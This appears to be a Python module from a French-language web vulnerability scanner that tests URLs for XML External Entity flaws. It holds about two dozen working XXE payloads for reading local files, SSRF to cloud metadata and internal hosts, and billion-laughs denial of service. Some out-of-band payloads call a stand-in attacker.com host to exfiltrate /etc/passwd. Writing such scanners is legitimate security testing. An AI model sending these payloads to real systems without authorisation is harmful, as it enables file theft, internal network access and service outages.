"""
Détecteur de vulnérabilités XXE (XML External Entity)
"""

import asyncio
from typing import Optional
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class DetecteurXXE:
    """
    Détecte les vulnérabilités XML External Entity
    """

    def __init__(self):
        """Initialise le détecteur XXE avec 25+ payloads"""
        
        # === FILE DISCLOSURE PAYLOADS (read local files) ===
        self.payloads_file_disclosure = [
            # 1. XXE classique /etc/passwd
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>''',
            
            # 2. XXE avec CDATA wrapper (bypass filters)
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY wrapper "<![CDATA[&xxe;]]>">
]>
<root>
    <data>&wrapper;</data>
</root>''',
            
            # 3. Windows files
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
    <data>&xxe;</data>
</root>''',
            
            # 4. Multiple files
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe1 SYSTEM "file:///etc/passwd">
<!ENTITY xxe2 SYSTEM "file:///etc/hosts">
]>
<root>
    <data>&xxe1;&xxe2;</data>
</root>''',
            
            # 5. PHP wrapper
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
    <data>&xxe;</data>
</root>''',
            
            # 6. UTF-7 encoding bypass
            '''<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>''',
        ]
        
        # === SSRF PAYLOADS (Server-Side Request Forgery via XXE) ===
        self.payloads_ssrf = [
            # 7. HTTP request to internal network
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://localhost:22">
]>
<root>
    <data>&xxe;</data>
</root>''',
            
            # 8. AWS metadata
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <data>&xxe;</data>
</root>''',
            
            # 9. Internal port scanning
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<root>
    <data>&xxe;</data>
</root>''',
        ]
        
        # === BLIND XXE (Out-of-Band) ===
        self.payloads_blind_oob = [
            # 10. Classic OOB DTD
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root/>''',
            
            # 11. Parameter entity with file exfiltration
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
<root/>''',
            
            # 12. FTP-based OOB
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "ftp://attacker.com:21/xxe">
%xxe;
]>
<root/>''',
            
            # 13. DNS-based blind XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://xxe.attacker.com">
%xxe;
]>
<root/>''',
        ]
        
        # === DOS PAYLOADS (Billion Laughs, etc.) ===
        self.payloads_dos = [
            # 14. Billion Laughs Attack
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>
    <data>&lol4;</data>
</root>''',
            
            # 15. Quadratic Blowup
            '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<root>
    <data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>
</root>''',
        ]
        
        # === ADVANCED TECHNIQUES ===
        self.payloads_advanced = [
            # 16. DTD in SOAP
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
    <data>&xxe;</data>
</soap:Body>
</soap:Envelope>''',
            
            # 17. SVG XXE
            '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="16">&xxe;</text>
</svg>''',
            
            # 18. XInclude attack
            '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd"/>
</foo>''',
            
            # 19. XSLT XXE
            '''<?xml version="1.0"?>
<!DOCTYPE xsl:stylesheet [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    <data>&xxe;</data>
</xsl:template>
</xsl:stylesheet>''',
            
            # 20. Office Open XML XXE (docx, xlsx)
            '''<?xml version="1.0"?>
<!DOCTYPE x [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>
    <content>&xxe;</content>
</document>''',
        ]
        
        # === ENCODING BYPASS ===
        self.payloads_encoding = [
            # 21. UTF-16 encoding
            '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',
            
            # 22. Base64 in DTD
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root/>''',
        ]
        
        # === XML BOMB (Resource exhaustion) ===
        self.payloads_bomb = [
            # 23. Large entity expansion
            '''<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<root>&c;</root>''',
        ]
        
        # Combiner tous les payloads
        self.payloads_xxe = (
            self.payloads_file_disclosure +
            self.payloads_ssrf +
            self.payloads_blind_oob +
            self.payloads_dos +
            self.payloads_advanced +
            self.payloads_encoding +
            self.payloads_bomb
        )
        
        logger.info(f"✅ {len(self.payloads_xxe)} payloads XXE chargés")

    async def detecter(self, url: str) -> Optional[Vulnerabilite]:
        """
        Détecte les vulnérabilités XXE
        
        Args:
            url: URL à tester
            
        Returns:
            Vulnerabilite: Vulnérabilité XXE si trouvée
        """
        try:
            logger.info(f"🔍 Test XXE: {url}")
            
            async with aiohttp.ClientSession() as session:
                for payload in self.payloads_xxe:
                    try:
                        headers = {'Content-Type': 'application/xml'}
                        
                        async with session.post(
                            url,
                            data=payload,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            contenu = await response.text()
                            
                            # Vérifier si /etc/passwd est lu
                            if 'root:' in contenu or 'daemon:' in contenu:
                                logger.success("✅ XXE détecté!")
                                
                                return Vulnerabilite(
                                    type="XXE",
                                    severite="CRITIQUE",
                                    url=url,
                                    description="Vulnérabilité XML External Entity permettant la lecture de fichiers",
                                    payload=payload,
                                    preuve=contenu[:500],
                                    cvss_score=9.1,
                                    remediation="Désactiver les entités externes XML dans le parser"
                                )
                    
                    except Exception:
                        continue
                    
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur test XXE: {str(e)}")
        
        return None

